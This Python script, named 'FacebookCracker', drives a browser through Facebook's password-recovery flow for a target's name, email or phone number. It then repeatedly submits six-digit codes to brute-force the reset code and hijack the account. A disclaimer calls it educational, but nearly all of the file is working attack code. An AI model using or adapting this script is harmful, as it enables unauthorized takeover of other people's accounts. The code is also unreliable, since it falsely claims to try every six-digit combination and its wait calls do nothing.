"""
    NOTICE: This program was made solely for education and entertainment
    purposes, the developer is not responsible for any illegal or unauthorized
    use of this program.
"""

import urllib.parse

import itertools
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from bs4 import BeautifulSoup

class FacebookCracker(object):
    def __init__(self):
        self.InitFacebook('Email or Full Name, or phone number')

    def InitFacebook(self, fname):

        e = 0

        driver = webdriver.Firefox()
        driver.get('https://www.facebook.com/login/identify?ctx=recover')
        

        inputElement = driver.find_element("id", "identify_email")
        inputElement.send_keys(fname)
        WebDriverWait(driver, 4)
        
        # Presses enter
        inputElement.send_keys(Keys.ENTER)
        
        # Clicks button to select person -- Unless specified otherwise, will select first person
        btnElement = driver.find_element("css selector", "a.uiButton")
        btnElement.click()
        WebDriverWait(driver, 7)
        
        # Selects radio element for phone -- if phone is not
        # connected it will select email and this will not work
        radElement = driver.find_element("id", "u_0_1")
        radElement.click()
        WebDriverWait(driver, 7)
        
        # Presses enter on the "a"
        btnElement2 = driver.find_element("id", "u_0_2")
        btnElement2.click()
        WebDriverWait(driver, 9)
        
        # Finds the input element
        inputElement2 = driver.find_element("class name", "inputtext")
        
        # List that holds starter lists to find permutations for
        numberPerms = [['0', '1', '2', '3', '4', '5'],
                       ['1', '2', '3', '4', '5', '6'],
                       ['2', '3', '4', '5', '6', '7'],
                       ['3', '4', '5', '6', '7', '8'],
                       ['4', '5', '6', '7', '8', '9'],
                       ['5', '6', '7', '8', '9', '0'],
                       ['6', '7', '8', '9', '0', '1'],
                       ['7', '8', '9', '0', '1', '2'],
                       ['8', '9', '0', '1', '2', '3'],
                       ['9', '0', '1', '2', '3', '4']]

        # Runs every possible permutation from list above, creating every possible
        # 6 digit combination
        for i in numberPerms:
            for b in itertools.permutations(i):
                theStr = ''.join(map(str, b))
                inputElement3 = driver.find_element("class name", "inputtext")
                inputElement3.send_keys(theStr)
                inputElement3.send_keys(Keys.ENTER)

# Initializing class
if __name__ == '__main__':
    fbook = FacebookCracker()
